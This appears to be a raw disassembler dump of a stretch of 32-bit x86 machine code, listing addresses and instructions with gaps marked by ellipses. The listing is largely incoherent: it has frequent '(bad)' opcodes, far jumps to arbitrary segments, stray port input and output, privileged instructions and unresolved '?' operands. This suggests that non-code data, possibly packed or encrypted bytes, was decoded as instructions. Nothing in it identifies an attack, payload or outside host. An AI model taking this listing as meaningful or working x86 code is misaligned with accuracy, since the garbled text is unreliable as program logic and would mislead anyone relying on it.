  43050e:	data16 int3 
  430510:	jle    0x4304e2
  430512:	push   ebx
  430513:	mov    ecx,0xaf024051
  430518:	dec    esp
  430519:	push   cs
  43051a:	out    0x32,al
  43051c:	jmp    0x430578
  43051e:	mov    BYTE PTR [edx],dl
  430520:	dec    esp
  430521:	sar    al,0x2b
  430524:	lods   eax,DWORD PTR ds:[esi]
  430525:	and    bl,dl
  430527:	or     BYTE PTR [edi],0xe3
  43052a:	leave  
  43052b:	out    dx,al
  43052c:	add    eax,0x3fd59e4c
  430531:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430532:	inc    ecx
  430533:	dec    ecx
  430534:	loope  0x43056a
  430536:	std    
  430537:	iret   
  430538:	cdq    
  430539:	jge    0x43057f
  43053b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43053c:	frstor [ebp+esi*1+0x5f]
  430540:	out    dx,eax
	...
  4305b1:	add    BYTE PTR [eax],al
  4305b3:	add    BYTE PTR [esi],bh
  4305b5:	push   esi
  4305b6:	into   
  4305b7:	nop
  4305b8:	out    dx,al
  4305b9:	cwde   
  4305ba:	jle    0x4305ba
  4305bc:	xlat   BYTE PTR ds:[ebx]
  4305bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4305be:	add    cl,BYTE PTR [esi-0x27]
  4305c1:	push   ss
  4305c2:	in     eax,0xd5
  4305c4:	cmc    
  4305c5:	std    
  4305c6:	add    DWORD PTR [eax],eax
  4305c8:	cmc    
  4305c9:	add    BYTE PTR [eax],al
  4305cb:	add    BYTE PTR [eax-0x29e00750],bh
  4305d1:	mov    dh,0x45
  4305d3:	jo     0x43057d
  4305d5:	xor    al,0x36
  4305d7:	and    eax,0x5972d840
  4305dc:	sbb    edx,DWORD PTR [edi+edx*1]
  4305df:	sub    edx,ebx
  4305e1:	dec    esp
  4305e2:	popa   
  4305e3:	(bad)  
  4305e4:	jmp    0x430639
  4305e6:	call   0xdf61:0x25e3e446
  4305ed:	cwde   
  4305ee:	and    eax,0xd843e609
  4305f3:	jae    0x43065a
  4305f5:	cmp    DWORD PTR [edx+ebx*8],ebp
  4305f8:	mov    al,ds:0x4b9df7bc
  4305fd:	hlt    
  4305fe:	out    dx,al
  4305ff:	(bad)  
  430600:	jno    0x430631
  430602:	mov    edx,0x3a79593c
  430607:	cld    
  430608:	adc    eax,0x496f3ee9
  43060d:	xor    al,0x9e
  43060f:	xchg   edx,eax
  430610:	fist   DWORD PTR [edx-0x11020fd9]
  430616:	mov    eax,cs
  430618:	jbe    0x430689
  43061a:	out    dx,eax
  43061b:	ret    0x868d
  43061e:	adc    al,0x11
  430620:	imul   edx,DWORD PTR [ebx],0x28
  430623:	leave  
  430624:	aas    
  430625:	jnp    0x43060e
  430627:	fadd   DWORD PTR [esi+0x32878e15]
  43062d:	ja     0x4305c7
  43062f:	in     al,dx
  430630:	jbe    0x43062b
  430632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430633:	jecxz  0x4305e2
  430635:	add    al,0xfa
  430637:	jo     0x43063e
  430639:	fsubr  st(2),st
  43063b:	retf   0x780d
  43063e:	cli    
  43063f:	adc    DWORD PTR ss:[ecx+0x4871bfb0],ecx
  430646:	add    esp,DWORD PTR [esi-0x66bbf024]
  43064c:	stos   DWORD PTR es:[edi],eax
  43064d:	clc    
  43064e:	mov    ?,ecx
  430650:	lock inc ebx
  430652:	sbb    bh,dl
  430654:	vpsubsw xmm0,xmm0,XMMWORD PTR [ebx+0x512f2d82]
  43065c:	stc    
  43065d:	push   ebx
  43065e:	dec    ecx
  43065f:	or     ebx,DWORD PTR [edi-0x3a7e49ad]
  430665:	mov    cl,ch
  430667:	jne    0x430661
  430669:	ds enter 0x43c9,0x70
  43066e:	or     DWORD PTR ds:0x82d3a54,esp
  430674:	sub    ebp,DWORD PTR [esi-0x1637d133]
  43067a:	outs   dx,BYTE PTR ds:[esi]
  43067b:	pop    ds
  43067c:	rcr    DWORD PTR [ecx],1
  43067e:	cs push es
  430680:	das    
  430681:	jmp    0x13f1:0xd2b01739
  430688:	fiadd  DWORD PTR [eax+0xc6d599c]
  43068e:	ins    BYTE PTR es:[edi],dx
  43068f:	jns    0x43063b
  430691:	lahf   
  430692:	or     ebp,edx
  430694:	test   al,0xee
  430696:	mov    bh,0xa2
  430698:	mov    BYTE PTR [edx-0x2680cb47],dl
  43069e:	repnz and esi,DWORD PTR [edx+0x72]
  4306a2:	cmp    eax,0xbc87d9be
  4306a7:	mov    DWORD PTR [edi-0x5319e1b],edx
  4306ad:	stos   BYTE PTR es:[edi],al
  4306ae:	dec    esp
  4306af:	mov    bl,0x46
  4306b1:	push   ds
  4306b2:	test   al,0x3
  4306b4:	push   edx
  4306b5:	das    
  4306b6:	fwait
  4306b7:	sahf   
  4306b8:	inc    ebp
  4306b9:	pop    ecx
  4306ba:	push   0xffffff92
  4306bc:	es mov ecx,0xf8f7f2
	...
  430732:	add    BYTE PTR [eax],al
  430734:	jno    0x4306d7
  430736:	(bad)  
  430737:	test   al,0xd6
  430739:	(bad)  
  43073a:	jg     0x430735
  43073c:	xor    dl,ah
  43073e:	(bad)  
  43073f:	or     al,0x9f
  430741:	pop    ecx
  430742:	inc    ecx
  430743:	inc    edx
  430744:	jmp    0x0:0xf50001fe
  43074b:	add    ch,ah
  43074d:	mov    esp,DWORD PTR [ebx]
  43074f:	add    dl,BYTE PTR [esi-0x49a5a560]
  430755:	mov    esp,0xc719eb4e
  43075a:	sbb    ecx,DWORD PTR ds:0xb26ad928
  430760:	lahf   
  430761:	popf   
  430762:	neg    edi
  430764:	outs   dx,BYTE PTR ds:[esi]
  430765:	out    0xdf,eax
  430767:	cli    
  430768:	and    al,0xf7
  43076a:	fadd   DWORD PTR [ebx-0x34]
  43076d:	push   0x6b
  43076f:	fidiv  WORD PTR [ebx-0x7ad59dbe]
  430775:	(bad)
  430778:	jecxz  0x4307d2
  43077a:	sbb    ah,dl
  43077c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43077d:	bound  ebx,QWORD PTR [eax-0x3e37daef]
  430783:	daa    
  430784:	bound  ebp,QWORD PTR ds:0x241fe75a
  43078a:	xchg   esi,eax
  43078b:	jg     0x430729
  43078d:	(bad)  
  43078f:	enter  0xd18d,0xce
  430793:	adc    DWORD PTR [edi+0x73],0xa9c92422
  43079a:	stc    
  43079b:	aas    
  43079c:	daa    
  43079d:	nop
  43079e:	int3   
  43079f:	div    edx
  4307a1:	ins    BYTE PTR es:[edi],dx
  4307a2:	hlt    
  4307a3:	mov    eax,ds:0xda4e9e08
  4307a8:	xchg   ebp,ebp
  4307aa:	sub    eax,ebx
  4307ac:	ds inc ecx
  4307ae:	fs daa 
  4307b0:	cld    
  4307b1:	dec    ebx
  4307b2:	inc    esi
  4307b3:	push   ebx
  4307b4:	mov    bl,ah
  4307b6:	nop
  4307b7:	pop    esp
  4307b9:	add    bl,BYTE PTR [edx+0x6e]
  4307bc:	loope  0x4307af
  4307be:	rcr    DWORD PTR [ebx+0x5c],cl
  4307c1:	stc    
  4307c2:	xchg   ecx,eax
  4307c3:	and    dl,BYTE PTR [edi+ebp*8]
  4307c6:	mov    dl,0x31
  4307c8:	cwde   
  4307c9:	add    BYTE PTR [esi],al
  4307cb:	fwait
  4307cc:	mov    dh,bh
  4307ce:	push   0x58f516db
  4307d3:	add    bl,BYTE PTR [esi+0x60]
  4307d6:	jno    0x4307c9
  4307d8:	into   
  4307d9:	adc    ebx,DWORD PTR [esi-0x60]
  4307dc:	scas   al,BYTE PTR es:[edi]
  4307dd:	ror    BYTE PTR [ebx+ecx*2+0x62],cl
  4307e1:	test   DWORD PTR [edi],0xb1c889b1
  4307e7:	push   0x11ef63d6
  4307ec:	mov    WORD PTR [eax+0x3694ac6e],?
  4307f2:	stos   DWORD PTR es:[edi],eax
  4307f3:	push   edi
  4307f4:	test   al,0x1d
  4307f6:	fisubr WORD PTR [bp+si-0x1536]
  4307fb:	pushf  
  4307fc:	xchg   ebp,eax
  4307fd:	jge    0x43079d
  4307ff:	inc    ecx
  430800:	push   edx
  430801:	ret    0x7e7a
  430804:	add    bl,BYTE PTR [edi-0x66cbdd24]
  43080a:	inc    esi
  43080b:	out    0x91,al
  43080d:	mov    DWORD PTR [ebx],ecx
  43080f:	and    BYTE PTR [ebp-0x10],0x46
  430813:	push   0x5a9c49c0
  430818:	popf   
  430819:	and    DWORD PTR [esi-0x44],0xb49612c5
  430820:	add    bl,cl
  430822:	adc    BYTE PTR [esi+0x76],dh
  430825:	and    ebx,DWORD PTR [ecx+ecx*8+0x5de4c006]
  43082c:	cld    
  43082d:	jl     0x430811
  43082f:	push   esp
  430830:	pop    ebx
  430831:	xor    edx,ecx
  430833:	jnp    0x4308a8
  430835:	xor    ah,al
  430837:	adc    BYTE PTR [bp+si+0x34],ch
  43083b:	mov    ebx,0xd0110f42
  430840:	fild   DWORD PTR [eax]
	...
  4308b2:	add    BYTE PTR [eax],al
  4308b4:	adc    al,0x74
  4308b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4308b7:	push   ebp
  4308b8:	in     al,0xd5
  4308ba:	cmc    
  4308bb:	jne    0x4308f4
  4308bd:	pop    edi
  4308be:	adc    ebp,edx
  4308c0:	adc    ch,BYTE PTR [eax-0x205d45]
  4308c6:	add    DWORD PTR [eax],eax
  4308c8:	cmc    
  4308c9:	add    BYTE PTR [eax],al
  4308cb:	add    BYTE PTR [edi-0x22],bh
  4308ce:	adc    bl,BYTE PTR [edx+ecx*1]
  4308d1:	sub    DWORD PTR [ecx+0x4203b060],0xc7d945af
  4308db:	fmul   DWORD PTR [ebp+0x15]
  4308de:	mov    ds:0xb0e039d1,al
  4308e3:	ret    0x695e
  4308e6:	and    eax,0xb0ad2753
  4308eb:	pop    ecx
  4308ec:	mov    dl,0xd5
  4308ee:	leave  
  4308ef:	enter  0x464e,0x71
  4308f3:	xor    esp,edx
  4308f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4308f6:	popf   
  4308f7:	or     eax,0xbe3c4dd0
  4308fc:	(bad)  
  4308fd:	jmp    0x43091c
  4308ff:	imul   eax,edi,0xb6b76246
  430905:	cdq    
  430906:	sub    eax,0xa82d96a4
  43090b:	xor    BYTE PTR [ebx-0x6c],dh
  43090e:	popf   
  43090f:	cs in  al,0x49
  430912:	mov    ds:0xe2a57ab,eax
  430917:	jo     0x4308de
  430919:	cs jne 0x43092c
  43091c:	repz or dh,dl
  43091f:	mov    BYTE PTR [ebp-0x28e5ac56],0x9e
  430926:	mov    WORD PTR [eax],ds
  430928:	mov    bh,0x3f
  43092a:	or     BYTE PTR [edi],cl
  43092c:	std    
  43092d:	dec    esi
  43092e:	push   edi
  43092f:	push   ebp
  430930:	sub    ah,ah
  430932:	(bad)  
  430933:	sbb    al,0xff
  430935:	aaa    
  430936:	ret    
  430937:	fistp  WORD PTR ds:0xa4e77e79
  43093d:	push   eax
  43093e:	out    0x8f,eax
  430940:	xor    BYTE PTR [ecx],dl
  430942:	pop    eax
  430943:	mov    bl,0xd5
  430945:	pop    edx
  430946:	mov    bl,0x36
  430948:	xchg   edi,eax
  430949:	jb     0x4309c2
  43094b:	add    ebp,DWORD PTR [ebx-0x6f7d5e34]
  430951:	push   ebp
  430952:	and    eax,0xfa2afae
  430957:	and    al,0xd8
  430959:	cmp    dh,BYTE PTR [ebx+eiz*2]
  43095c:	jle    0x4309b5
  43095e:	mov    DWORD PTR [ebx],0x42218a26
  430964:	icebp  
  430965:	mov    dh,0x1b
  430967:	mov    dh,0xa3
  430969:	test   DWORD PTR [ebp+0x7d7548dd],ebx
  43096f:	js     0x43093f
  430971:	xchg   DWORD PTR [esi-0x7],ebp
  430974:	pop    ss
  430975:	aas    
  430976:	inc    edx
  430977:	rcl    DWORD PTR [esi+edx*1+0x9],0x6f
  43097c:	retf   
  43097d:	aad    0x66
  43097f:	inc    BYTE PTR [eax+edx*2+0x25]
  430983:	aas    
  430984:	loopne 0x43095d
  430986:	pop    ss
  430987:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430988:	out    0xf7,al
  43098a:	xchg   ecx,eax
  43098b:	inc    esi
  43098c:	dec    edx
  43098d:	in     al,dx
  43098e:	and    ch,0xe9
  430991:	add    eax,0x62ecace3
  430996:	(bad)  
  430997:	in     al,dx
  430998:	inc    edi
  430999:	xor    eax,0x468b4dfe
  43099e:	das    
  43099f:	test   BYTE PTR [ecx],dl
  4309a1:	les    esp,FWORD PTR [ecx+0x15]
  4309a4:	mov    WORD PTR [ebp-0x7d],cs
  4309a7:	mov    esp,tr2
  4309aa:	fdivp  st(1),st
  4309ac:	sbb    bh,BYTE PTR [edi]
  4309ae:	jp     0x430a14
  4309b0:	jns    0x4309d9
  4309b2:	mov    cl,0xef
  4309b4:	dec    esi
  4309b5:	push   eax
  4309b6:	mov    al,0x9f
  4309b8:	dec    edx
  4309b9:	or     al,0x41
  4309bb:	inc    eax
  4309bc:	sbb    BYTE PTR [edx],dh
  4309be:	adc    eax,0xe9af
	...
  430a33:	add    BYTE PTR [ebx],bl
  430a35:	out    dx,eax
  430a36:	shl    BYTE PTR [esi],0xf4
  430a39:	aas    
  430a3a:	(bad)  
  430a3b:	out    dx,eax
  430a3c:	fwait
  430a3d:	aaa    
  430a3e:	call   0x35dfd637
  430a43:	xchg   esp,eax
  430a44:	aam    0x0
  430a46:	add    al,BYTE PTR [eax]
  430a48:	cmc    
  430a49:	add    BYTE PTR [eax],al
  430a4b:	add    cl,ah
  430a4d:	adc    BYTE PTR [ebx],bl
  430a4f:	call   0xe1178d10
  430a54:	and    ecx,DWORD PTR [edx]
  430a56:	push   ds
  430a57:	bound  ebp,QWORD PTR [ebp+edi*8-0x42]
  430a5b:	sti    
  430a5c:	scas   al,BYTE PTR es:[edi]
  430a5d:	sbb    dl,BYTE PTR [ebx]
  430a5f:	mov    ch,0x62
  430a61:	nop
  430a62:	aas    
  430a63:	div    WORD PTR [eax+eiz*8-0x45568335]
  430a6b:	mov    bl,0x9d
  430a6d:	(bad)
  430a71:	push   ebp
  430a72:	adc    esi,DWORD PTR [edx+0x4b]
  430a75:	dec    ebp
  430a77:	jne    0x430a50
  430a79:	lods   al,BYTE PTR ds:[esi]
  430a7a:	daa    
  430a7b:	adc    al,0x9c
  430a7d:	jbe    0x430a35
  430a7f:	push   0xffffff9f
  430a81:	mov    bh,0x17
  430a83:	sub    dh,BYTE PTR [eax-0x11]
  430a86:	xchg   ecx,eax
  430a87:	pop    DWORD PTR [ecx-0x37]
  430a8a:	sub    ecx,DWORD PTR [ebx]
  430a8c:	mov    dh,0x42
  430a8e:	out    0xf,eax
  430a90:	xchg   edi,eax
  430a91:	std    
  430a92:	fsub   DWORD PTR [edi-0x2c19ca82]
  430a98:	ss jnp 0x430ad6
  430a9b:	pop    esp
  430a9c:	dec    ebx
  430a9d:	cld    
  430a9e:	adc    ah,BYTE PTR es:[esi-0x71]
  430aa2:	and    al,0xf9
  430aa4:	cmp    edx,eax
  430aa6:	cwde   
  430aa7:	jo     0x430aad
  430aa9:	jnp    0x430a80
  430aab:	fmul   st(6),st
  430aad:	pop    es
  430aae:	push   esp
  430aaf:	inc    BYTE PTR [ecx+0x2a]
  430ab2:	sbb    BYTE PTR [esi+0x30],dl
  430ab5:	or     cl,BYTE PTR [edx+0xf2c4873]
  430abb:	push   0x5e11717b
  430ac0:	mov    bh,0xf
  430ac2:	or     BYTE PTR cs:[esi+0x69],bl
  430ac6:	scas   eax,DWORD PTR es:[edi]
  430ac7:	adc    ebp,DWORD PTR [ebx]
  430ac9:	neg    BYTE PTR [ebx+ebp*2]
  430acc:	xor    DWORD PTR [esi-0x7f8cfe96],esi
  430ad2:	stc    
  430ad3:	imul   ebx,edx,0x3e
  430ad6:	arpl   WORD PTR ds:0xe41cf3e6,bx
  430adc:	adc    al,0x8b
  430ade:	sub    DWORD PTR [ecx+ecx*8-0x433b3a82],esi
  430ae5:	sbb    ebp,ebx
  430ae7:	out    0x87,al
  430ae9:	xchg   ebx,eax
  430aea:	cwde   
  430aeb:	mov    WORD PTR [edx],es
  430aed:	and    BYTE PTR [eax+ebp*1-0x46],al
  430af1:	mov    ecx,0x8cb47dd4
  430af6:	out    0x78,al
  430af8:	jb     0x430b2e
  430afa:	fistp  DWORD PTR [edx]
  430afc:	scas   al,BYTE PTR es:[edi]
  430afd:	(bad)  
  430afe:	pop    ebp
  430aff:	mov    ah,0xa4
  430b01:	(bad)  
  430b02:	stc    
  430b03:	outs   dx,BYTE PTR ds:[esi]
  430b04:	retf   0xa126
  430b07:	pop    ds
  430b08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b09:	sub    BYTE PTR [ebx+0x3f],dh
  430b0c:	hlt    
  430b0d:	fcom   DWORD PTR cs:[edi]
  430b10:	mov    eax,ds:0xbb6619d4
  430b15:	xor    al,0x3c
  430b17:	test   al,0x5f
  430b19:	push   ecx
  430b1a:	xchg   ecx,eax
  430b1b:	pop    es
  430b1c:	idiv   al
  430b1e:	mov    ebx,DWORD PTR [ebx+0x23]
  430b21:	pushf  
  430b22:	aas    
  430b23:	cmp    BYTE PTR [eax+0x6a],ah
  430b26:	xor    BYTE PTR [esp+eax*8],ah
  430b29:	ret    
  430b2a:	dec    esp
  430b2b:	pop    DWORD PTR [edx+ebp*2]
  430b2e:	ins    BYTE PTR es:[edi],dx
  430b2f:	scas   eax,DWORD PTR es:[edi]
  430b30:	aas    
  430b31:	push   0xffffffc1
  430b33:	jmp    0x308c:0x17b9ee86
  430b3a:	imul   esp,DWORD PTR [edx],0x60
  430b3d:	or     eax,0x14ad78
	...
  430bb2:	add    BYTE PTR [eax],al
  430bb4:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  430bba:	mov    ebx,0x4217e69a
  430bbf:	aas    
  430bc0:	mov    edx,0xc9ec2aff
  430bc5:	add    DWORD PTR [edx],eax
  430bc7:	add    ch,dh
  430bc9:	add    BYTE PTR [eax],al
  430bcb:	add    BYTE PTR [ecx],bh
  430bcd:	jnp    0x430b6a
  430bcf:	xchg   ebp,eax
  430bd0:	ret    
  430bd1:	jmp    FWORD PTR ds:0xd28c822f
  430bd7:	out    dx,eax
  430bd8:	out    0x9,eax
  430bda:	adc    bl,BYTE PTR [ebx]
  430bdc:	adc    DWORD PTR [eax],0x63bab738
  430be2:	mov    dl,0x53
  430be4:	inc    eax
  430be5:	out    0x6,eax
  430be7:	inc    edi
  430be8:	es mov eax,0x9507f951
  430bee:	mov    bh,0x89
  430bf0:	out    dx,al
  430bf1:	pop    eax
  430bf2:	mov    ?,WORD PTR [ebp+0x3b]
  430bf5:	dec    edx
  430bf6:	lahf   
  430bf7:	iret   
  430bf8:	test   BYTE PTR [eax-0x7aea05ac],cl
  430bfe:	adc    DWORD PTR [ebx],esi
  430c00:	jmp    0x36622481
  430c05:	jne    0x430bdd
  430c07:	stc    
  430c08:	icebp  
  430c09:	pop    eax
  430c0a:	fwait
  430c0b:	inc    bx
  430c0d:	mov    esp,0x2d41621b
  430c12:	mov    ecx,0xf9a82e8a
  430c17:	(bad)  
  430c19:	outs   dx,BYTE PTR ds:[esi]
  430c1a:	inc    esi
  430c1b:	in     al,dx
  430c1c:	(bad)  
  430c1d:	jbe    0x430c16
  430c1f:	adc    al,bh
  430c21:	sub    edi,eax
  430c23:	mov    cl,0x95
  430c25:	inc    esp
  430c26:	push   edi
  430c27:	test   al,0x47
  430c29:	and    eax,0xd08e7010
  430c2e:	cdq    
  430c2f:	xor    ch,dh
  430c31:	mul    BYTE PTR [ebx]
  430c33:	xchg   ecx,eax
  430c34:	test   al,0x43
  430c36:	jbe    0x430bbd
  430c38:	iret   
  430c39:	fisub  DWORD PTR [esi]
  430c3b:	mov    WORD PTR [ebx-0x20],?
  430c3e:	data16 mov ah,0xa7
  430c41:	outs   dx,DWORD PTR ds:[esi]
  430c42:	pop    eax
  430c43:	xor    bl,BYTE PTR [edx-0x58]
  430c46:	pop    eax
  430c47:	push   si
  430c49:	mov    al,0x6c
  430c4b:	mov    esi,DWORD PTR [ebx+0x507bd963]
  430c51:	rcl    BYTE PTR [ebp+0x1a],1
  430c54:	scas   al,BYTE PTR es:[edi]
  430c55:	push   0xffffffe9
  430c57:	xor    BYTE PTR [eax+0x75],ah
  430c5a:	mov    eax,0x4f86607c
  430c5f:	scas   al,BYTE PTR es:[edi]
  430c60:	aas    
  430c61:	out    dx,eax
  430c62:	out    0xd5,al
  430c64:	add    DWORD PTR [ebp+0xc],edi
  430c67:	jmp    0x7475:0x9182f4cc
  430c6e:	dec    eax
  430c6f:	push   ecx
  430c70:	pop    ecx
  430c71:	stc    
  430c72:	out    dx,al
  430c73:	push   esi
  430c74:	mov    cl,0xc2
  430c76:	push   edi
  430c77:	or     ch,BYTE PTR [esp+eax*1+0x7396a2b1]
  430c7e:	test   DWORD PTR [ebx+0x1d],esi
  430c81:	jmp    0x59f4:0x7503cd9d
  430c88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430c89:	out    dx,eax
  430c8a:	daa    
  430c8b:	test   DWORD PTR [ebx],0x930158f7
  430c91:	iret   
  430c92:	jl     0x430cc9
  430c94:	mov    dl,bh
  430c96:	cs enter 0x7a79,0x96
  430c9b:	mov    bl,0x12
  430c9d:	retf   0x8fac
  430ca0:	mov    esp,0x169f6fe
  430ca5:	and    DWORD PTR [eax+0x7f],esp
  430ca8:	shr    dh,1
  430caa:	xchg   BYTE PTR [ebp+0x2d],bh
  430cad:	mov    al,0xf8
  430caf:	mov    edx,0x454b9fb6
  430cb4:	setnp  BYTE PTR [ebp-0x77]
  430cb8:	cmp    ebx,DWORD PTR [edi-0x70]
  430cbb:	or     dh,dl
  430cbd:	mov    cl,BYTE PTR [ebx+0x1b]
  430cc0:	pop    esi
	...
  430d31:	add    BYTE PTR [eax],al
  430d33:	add    BYTE PTR [eax-0x40],cl
  430d36:	ret    0xcaf0
  430d39:	bnd jp 0x430d34
  430d3c:	ror    BYTE PTR [ecx],1
  430d3e:	cdq    
  430d3f:	jl     0x430d8f
  430d41:	(bad)  [esi+0x202be72]
  430d47:	add    ch,dh
  430d49:	add    BYTE PTR [eax],al
  430d4b:	add    bh,ch
  430d4d:	xor    al,0x84
  430d4f:	or     al,0x88
  430d51:	arpl   WORD PTR [esi],dx
  430d53:	xor    DWORD PTR [edx],esi
  430d55:	ror    BYTE PTR [ebp-0x6d],0x97
  430d59:	add    ebx,DWORD PTR [eax+0x32]
  430d5c:	rcl    DWORD PTR [edx+ebp*1-0x2d11bb2f],0xff
  430d64:	xor    DWORD PTR [ecx],eax
  430d66:	or     ebx,DWORD PTR [ebx-0x14e4a0a2]
  430d6c:	dec    esi
  430d6d:	sbb    eax,eax
  430d6f:	push   eax
  430d70:	or     esp,DWORD PTR ds:0xc8e423dc
  430d76:	xor    bh,BYTE PTR [eax]
  430d78:	in     al,0xf2
  430d7a:	sbb    DWORD PTR [esi-0x2],0x77
  430d7e:	xchg   BYTE PTR [ebp-0x31],dl
  430d81:	inc    edi
  430d82:	adc    esp,DWORD PTR [ebx]
  430d84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430d85:	aaa    
  430d86:	sbb    eax,0xcd5d2f61
  430d8b:	fs inc esi
  430d8d:	dec    ecx
  430d8e:	not    BYTE PTR ds:0x3063b149
  430d94:	push   esp
  430d95:	mov    BYTE PTR [edi],dl
  430d97:	lds    ebp,FWORD PTR [ecx]
  430d99:	pusha  
  430d9a:	pusha  
  430d9b:	push   0xce7f9bd0
  430da0:	repnz cmp ah,BYTE PTR [ecx+esi*2-0x522a2617]
  430da8:	mul    BYTE PTR [esi]
  430daa:	aaa    
  430dab:	jmp    0x285beb9b
  430db0:	sbb    al,0xa7
  430db2:	jp     0x430d84
  430db4:	push   edx
  430db5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430db6:	adc    DWORD PTR [ebx],esi
  430db8:	(bad)  [ebx-0x21badf35]
  430dbe:	push   0x3b40ad63
  430dc3:	add    al,BYTE PTR [eax]
  430dc5:	in     al,dx
  430dc6:	cmp    eax,0x4b3e68a
  430dcb:	pop    eax
  430dcc:	out    dx,eax
  430dcd:	adc    DWORD PTR [ebx+0x21],edi
  430dd0:	or     edx,DWORD PTR [ecx]
  430dd2:	lds    ecx,FWORD PTR [edi+0xeef4114]
  430dd8:	jecxz  0x430dbb
  430dda:	stc    
  430ddb:	cmp    DWORD PTR [ebp+ebx*2+0x16],0x35b5f415
  430de3:	retf   0x98fc
  430de6:	lock (bad) 
  430de8:	sub    esp,DWORD PTR [esi-0x16966d67]
  430dee:	jns    0x430e1e
  430df0:	repz mov al,0x1c
  430df3:	loope  0x430dcc
  430df5:	fwait
  430df6:	aad    0xae
  430df8:	push   ecx
  430df9:	cmp    al,0xf3
  430dfb:	xor    cl,BYTE PTR [eax+ebp*1]
  430dfe:	sar    ah,1
  430e00:	sti    
  430e01:	test   BYTE PTR [ebx-0x763fc580],0x25
  430e08:	xchg   edi,eax
  430e09:	sub    BYTE PTR [ecx],0xa0
  430e0c:	ss sub al,dl
  430e0f:	pop    esp
  430e10:	mov    ebx,0xc9f7e0ed
  430e15:	xchg   ecx,eax
  430e16:	dec    ebp
  430e17:	jne    0x430da8
  430e19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430e1a:	ins    DWORD PTR es:[edi],dx
  430e1b:	inc    edi
  430e1c:	fwait
  430e1d:	(bad)  
  430e1e:	or     eax,0xb680de23
  430e23:	jge    0x430dc1
  430e25:	stc    
  430e26:	fdivr  DWORD PTR [edx+0x17]
  430e29:	test   al,0xca
  430e2b:	xor    ecx,DWORD PTR [eax+0x1e090bd4]
  430e31:	xchg   ebp,eax
  430e32:	not    DWORD PTR [eax+0x23]
  430e35:	mov    ecx,0xbcc85bff
  430e3a:	cld    
  430e3b:	fstp   QWORD PTR [ecx]
  430e3d:	sub    eax,eax
  430e3f:	les    esp,FWORD PTR [ecx+0x0]
	...
  430eb1:	add    BYTE PTR [eax],al
  430eb3:	add    BYTE PTR [edi+eiz*2],al
  430eb6:	std    
  430eb7:	aaa    
  430eb8:	(bad)  
  430eb9:	mov    edi,0x8a6677ce
  430ebe:	retf   
  430ebf:	jne    0x430ecc
  430ec1:	scas   eax,DWORD PTR es:[edi]
  430ec2:	cmp    BYTE PTR [ecx-0x4d],dl
  430ec5:	add    eax,DWORD PTR [edx]
  430ec7:	add    ch,dh
  430ec9:	add    BYTE PTR [eax],al
  430ecb:	add    BYTE PTR [edx*4+0x350aba6b],al
  430ed2:	jmp    0xe628:0xf0e6191d
  430ed9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430eda:	fisubr WORD PTR [edx+0xd]
  430edd:	lds    esi,FWORD PTR [ecx+0x1b]
  430ee0:	mov    ecx,0xa43c6df0
  430ee5:	ror    DWORD PTR [esi+0x6b2627ce],1
  430eeb:	retf   
  430eec:	mov    edx,0xfb5b8bc4
  430ef1:	test   al,0x42
  430ef3:	aas    
  430ef4:	push   ebx
  430ef5:	sbb    edi,DWORD PTR [edi-0xe2cf722]
  430efb:	adc    DWORD PTR [esi-0x1099eb79],ebp
  430f01:	repnz dec ecx
  430f03:	or     al,0x23
  430f05:	push   ds
  430f06:	fild   QWORD PTR [esi+eiz*1-0x5bc8b8e6]
  430f0d:	lods   eax,DWORD PTR ds:[esi]
  430f0e:	leave  
  430f0f:	push   esi
  430f10:	push   edx
  430f11:	arpl   bx,cx
  430f13:	add    BYTE PTR [edx+0x4],cl
  430f16:	stc    
  430f17:	cwde   
  430f18:	jg     0x430eac
  430f1a:	dec    edx
  430f1b:	sbb    al,0x15
  430f1d:	dec    ebp
  430f1e:	fcomp  DWORD PTR [ebx-0x7dd24]
  430f24:	lea    esi,[ecx-0x281ffeb7]
  430f2a:	cmp    al,0xe5
  430f2c:	shl    DWORD PTR [esi+edx*1],1
  430f2f:	sbb    ebx,0x21f2666f
  430f35:	dec    ebx
  430f36:	xchg   DWORD PTR [eax],esi
  430f38:	fs xor al,0xd3
  430f3b:	sbb    DWORD PTR [eax+0x67],edi
  430f3e:	xchg   edi,eax
  430f3f:	mov    ecx,DWORD PTR [edi+esi*1]
  430f42:	neg    DWORD PTR [ebx+0x5e]
  430f45:	into   
  430f46:	in     eax,dx
  430f47:	cs ins DWORD PTR es:[edi],dx
  430f49:	or     eax,0xfd634be5
  430f4e:	jbe    0x430f6d
  430f50:	(bad)  
  430f51:	out    0x9f,eax
  430f53:	pop    eax
  430f54:	mov    WORD PTR [ebx-0x1e],?
  430f57:	push   ss
  430f58:	push   cs
  430f59:	rcr    BYTE PTR [ebx-0x317b6f77],cl
  430f5f:	adc    eax,0x1cf29748
  430f64:	mov    dh,0xdc
  430f66:	dec    esp
  430f67:	xchg   ebp,eax
  430f68:	adc    eax,0x5172f16d
  430f6d:	loopne 0x430ef8
  430f6f:	jne    0x430fb3
  430f71:	les    edx,FWORD PTR [esi+ebx*1]
  430f74:	test   al,0x5
  430f76:	cwde   
  430f77:	xchg   edx,eax
  430f78:	or     eax,0x91b40061
  430f7d:	and    DWORD PTR [edi+0x46],ebx
  430f80:	repz push ecx
  430f82:	xchg   esi,eax
  430f83:	sub    ecx,DWORD PTR [edi]
  430f85:	sub    edi,DWORD PTR fs:[ebx-0x5d]
  430f89:	jmp    0xff9b:0xd6f6db20
  430f90:	lds    esi,FWORD PTR [edi+0x3bb890db]
  430f96:	pop    ebx
  430f97:	in     al,0x42
  430f99:	loopne 0x430f8b
  430f9b:	jg     0x430f65
  430f9d:	jbe    0x430fb7
  430f9f:	mov    ah,BYTE PTR [edi]
